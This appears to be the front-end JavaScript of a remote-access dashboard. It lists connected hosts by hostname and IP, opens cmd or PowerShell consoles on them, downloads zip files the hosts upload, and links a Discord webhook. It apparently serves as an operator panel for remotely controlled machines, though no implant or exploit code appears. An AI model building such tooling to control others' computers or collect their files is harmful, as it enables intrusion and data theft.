// language: JavaScript, file: public/js/dashboard.js
const $ = (id) => document.getElementById(id);

let currentClient = null;
let pollTimer = null;

async function loadMe() {
  const r = await fetch('/api/me');
  if (r.status === 401) { location.href = '/signin.html'; return; }
  const u = await r.json();
  $('who').textContent = u.username;
  $('u2').textContent = u.username;
  $('e2').textContent = u.email;
  $('key').textContent = u.accountKey;
  $('key2').textContent = '•'.repeat(u.accountKey.length);
  $('key2').dataset.real = u.accountKey;
  $('key2').dataset.shown = '0';
  $('since').textContent = new Date(u.createdAt).toLocaleDateString();
  $('wh').textContent = u.discordWebhook ? 'connected' : '—';
  $('whurl').value = u.discordWebhook || '';
}

document.querySelectorAll('.nav a').forEach((a) => {
  a.addEventListener('click', () => {
    document.querySelectorAll('.nav a').forEach((x) => x.classList.remove('active'));
    document.querySelectorAll('.section').forEach((x) => x.classList.remove('active'));
    a.classList.add('active');
    $(a.dataset.tab).classList.add('active');

    const tab = a.dataset.tab;
    if (tab === 'overview') { loadOverview(); startPolling(); }
    else if (tab === 'hosts') { loadHosts(); startPolling(); }
    else if (tab === 'remote') { loadRemote(); startPolling(); }
    else stopPolling();
  });
});

function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
function startPolling() {
  stopPolling();
  pollTimer = setInterval(() => {
    const active = document.querySelector('.nav a.active')?.dataset.tab;
    if (active === 'overview') loadOverview();
    else if (active === 'hosts') loadHosts();
    else if (active === 'remote') loadRemote();
  }, 3000);
}

async function fetchClients() {
  const r = await fetch('/api/clients');
  if (!r.ok) return [];
  return r.json();
}

async function loadOverview() {
  const list = await fetchClients();
  const online = list.filter((c) => c.online).length;
  $('ov-online').textContent = online;
  $('ov-offline').textContent = list.length - online;
  $('ov-total').textContent = list.length;
}

async function loadHosts() {
  const list = await fetchClients();
  const grid = $('h-grid');
  grid.innerHTML = '';
  if (list.length === 0) {
    grid.innerHTML = '<div class="note">no hosts yet.</div>';
    return;
  }
  list.forEach((c) => {
    const el = document.createElement('div');
    el.className = 'tile';
    el.style.cursor = 'pointer';
    el.innerHTML = `
      <div class="k" style="color:${c.online ? 'var(--green-2)' : 'var(--orange-2)'}">${c.online ? '● online' : '○ offline'}</div>
      <div class="v">${escapeHtml(c.hostname)}</div>
      <div class="k" style="margin-top:8px">${escapeHtml(c.ip)}</div>
      <div class="k" style="margin-top:8px">last seen ${timeAgo(c.lastSeen)}</div>`;
    el.addEventListener('click', () => openHostDetail(c));
    grid.appendChild(el);
  });
}

async function openHostDetail(c) {
  document.getElementById('h-detail')?.remove();

  const box = document.createElement('div');
  box.id = 'h-detail';
  box.className = 'card';
  box.style.maxWidth = '720px';
  box.style.marginTop = '24px';
  box.innerHTML = `
    <div class="brand"><span class="w">host</span><span class="h">detail</span></div>
    <h1>${escapeHtml(c.hostname)}</h1>
    <div class="sub">${escapeHtml(c.ip)}</div>
    <div class="tiles" style="grid-template-columns:1fr 1fr">
      <div class="tile"><div class="k">client id</div><div class="v mono">${c.id}</div></div>
      <div class="tile"><div class="k">state</div><div class="v" style="color:${c.online ? 'var(--green-2)' : 'var(--orange-2)'}">${c.online ? 'online' : 'offline'}</div></div>
      <div class="tile"><div class="k">ipv4</div><div class="v mono">${escapeHtml(c.ip)}</div></div>
      <div class="tile"><div class="k">last seen</div><div class="v">${new Date(c.lastSeen).toLocaleString()}</div></div>
    </div>
    <div style="display:flex;gap:8px;margin-top:18px;flex-wrap:wrap">
      <button class="ghost" id="hd-cmd" style="margin-top:0">open cmd</button>
      <button class="ghost" id="hd-ps"  style="margin-top:0">open powershell</button>
      <button class="ghost" id="hd-close" style="margin-top:0">close</button>
    </div>
    <h2 style="margin-top:28px">uploads</h2>
    <div class="sub">zip files this host has pushed.</div>
    <div id="hd-uploads" style="display:flex;flex-direction:column;gap:8px"></div>
    <div class="err" id="hd-err"></div>`;

  document.getElementById('hosts').appendChild(box);

  box.querySelector('#hd-cmd').addEventListener('click', () => popConsole(c, 'cmd'));
  box.querySelector('#hd-ps').addEventListener('click', () => popConsole(c, 'powershell'));
  box.querySelector('#hd-close').addEventListener('click', () => box.remove());

  await loadUploads(c.id, box.querySelector('#hd-uploads'), box.querySelector('#hd-err'));
}

async function loadUploads(clientId, container, errEl) {
  container.innerHTML = '<div class="note">loading…</div>';
  const r = await fetch(`/api/clients/${clientId}/uploads`);
  if (!r.ok) { container.innerHTML = ''; errEl.textContent = 'failed to load uploads'; return; }
  const rows = await r.json();
  container.innerHTML = '';
  if (rows.length === 0) {
    container.innerHTML = '<div class="note">no uploads yet. the client can push zips to /api/client/upload.</div>';
    return;
  }
  rows.forEach((u) => {
    const el = document.createElement('div');
    el.className = 'tile';
    el.style.display = 'flex';
    el.style.justifyContent = 'space-between';
    el.style.alignItems = 'center';
    el.innerHTML = `
      <div>
        <div class="k">${new Date(u.created_at).toLocaleString()}</div>
        <div class="v">${escapeHtml(u.filename)}</div>
        <div class="k" style="margin-top:6px">${humanSize(u.size)}</div>
      </div>
      <button class="orange" style="width:auto;margin:0;padding:10px 18px">download</button>`;
    el.querySelector('button').addEventListener('click', () => {
      window.location.href = `/api/uploads/${u.id}/download`;
    });
    container.appendChild(el);
  });
}

async function loadRemote() {
  const list = (await fetchClients()).filter((c) => c.online);
  const box = $('r-remote-list');
  box.innerHTML = '';
  if (list.length === 0) {
    box.innerHTML = '<div class="note">no online clients right now.</div>';
    $('r-actions').style.display = 'none';
    return;
  }
  list.forEach((c) => {
    const el = document.createElement('div');
    el.className = 'tile';
    el.style.cursor = 'pointer';
    el.style.display = 'flex';
    el.style.justifyContent = 'space-between';
    el.style.alignItems = 'center';
    el.innerHTML = `
      <div>
        <div class="k" style="color:var(--green-2)">● online</div>
        <div class="v">${escapeHtml(c.hostname)}</div>
        <div class="k" style="margin-top:6px">${escapeHtml(c.ip)}</div>
      </div>
      <div class="note" style="margin:0">click to select</div>`;
    el.addEventListener('click', () => selectRemote(c));
    box.appendChild(el);
  });
}

function selectRemote(c) {
  currentClient = c;
  $('r-actions').style.display = 'block';
  $('r-sel').textContent = `${c.hostname} @ ${c.ip}`;
  $('r-err').textContent = '';
}

document.querySelectorAll('#r-actions [data-act]').forEach((btn) => {
  btn.addEventListener('click', () => {
    if (!currentClient) { $('r-err').textContent = 'select a client first'; return; }
    const act = btn.dataset.act;
    if (act === 'cmd' || act === 'powershell') popConsole(currentClient, act);
    else $('r-err').textContent = `${act} is not backed by the client yet.`;
  });
});

function popConsole(c, shell) {
  const q = new URLSearchParams({
    id: String(c.id),
    shell,
    host: c.hostname || '',
    ip: c.ip || '',
  });
  window.open('/cmd.html?' + q.toString(), '_blank', 'width=900,height=560');
}

document.addEventListener('click', (e) => {
  if (e.target && e.target.id === 'key-toggle') {
    const el = $('key2');
    const shown = el.dataset.shown === '1';
    if (shown) {
      el.textContent = '•'.repeat(el.dataset.real.length);
      el.dataset.shown = '0';
      e.target.textContent = 'reveal';
    } else {
      el.textContent = el.dataset.real;
      el.dataset.shown = '1';
      e.target.textContent = 'hide';
    }
  }
});

function timeAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function humanSize(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}

$('whtest').addEventListener('click', async () => {
  $('wherr').textContent = '';
  const r = await fetch('/api/webhook/test', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: $('whurl').value.trim() }),
  });
  const d = await r.json().catch(() => ({}));
  $('wherr').textContent = r.ok ? 'webhook live' : (d.error || 'failed');
  if (r.ok) $('wh').textContent = 'connected';
});

$('logout').addEventListener('click', async () => {
  await fetch('/api/logout', { method: 'POST' });
  location.href = '/signin.html';
});

loadMe();
loadOverview();
startPolling();